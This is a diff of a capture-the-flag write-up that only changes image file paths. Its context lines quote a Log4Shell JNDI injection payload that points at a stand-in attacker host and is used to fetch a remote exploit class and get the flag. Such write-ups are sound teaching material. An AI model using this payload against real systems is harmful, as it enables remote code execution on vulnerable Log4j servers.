@@ -14,7 +14,7 @@ Then, inject the malicious JNDI LDAP URL like this to get the flag
 
 `${jndi:ldap://attacker.com/ExploitPayload}`
 
-![](<../../.gitbook/assets/image (780).png>)
+![](<../../.gitbook/assets/image (780) (1).png>)
 
 If you are interested to find out more, I found a good read about [Log4Shell : JNDI Injection via Attackable Log4J](https://www.shiftleft.io/blog/log4shell-jndi-injection-via-attackable-log4j/).
 
@@ -26,7 +26,7 @@ This challenge tests our basic knowledge about Cybersecurity. Most of these answ
 
 ![](<../../.gitbook/assets/image (736).png>)
 
-![](<../../.gitbook/assets/image (716).png>)
+![](<../../.gitbook/assets/image (716) (1).png>)
 
 ![](<../../.gitbook/assets/image (723).png>)
 
@@ -36,7 +36,7 @@ This challenge tests our basic knowledge about Cybersecurity. Most of these answ
 
 ![](<../../.gitbook/assets/image (768).png>)
 
-![](<../../.gitbook/assets/image (708).png>)
+![](<../../.gitbook/assets/image (708) (1).png>)
 
 Finally, we would get the flag after answering 3 questions in a row
 
